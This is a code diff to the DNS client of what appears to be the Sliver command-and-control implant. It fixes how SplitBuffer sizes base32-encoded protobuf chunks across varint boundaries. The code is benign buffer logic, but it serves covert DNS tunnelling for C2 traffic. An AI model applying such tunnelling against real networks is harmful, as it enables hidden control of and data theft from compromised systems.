@@ -751,6 +751,20 @@ func (s *SliverDNSClient) SplitBuffer(msg *dnspb.DNSMessage, encoder encoders.En
 			// {{end}}
 		}
 		lastLen = len(msg.Data) // Save the amount of data that fit for the next loop
+
+		// Step back if a protobuf varint boundary caused encoded to overshoot.
+		// Adding 1 byte across a varint boundary (e.g. Data length 127→128) grows
+		// the proto by 2 bytes, which can jump base32 by +3 or +4, exceeding the
+		// subdataSpace-1 guard above.
+		for s.subdataSpace < len(encoded) && stop > start {
+			stop--
+			msg.Data = data[start:stop]
+			pbMsg, _ := proto.Marshal(msg)
+			encodedValue, _ := encoder.Encode(pbMsg)
+			encoded = string(encodedValue)
+		}
+		lastLen = len(msg.Data)
+
 		// {{if .Config.Debug}}
 		encodedSubdata = append(encodedSubdata, encoded)
 		// {{end}}
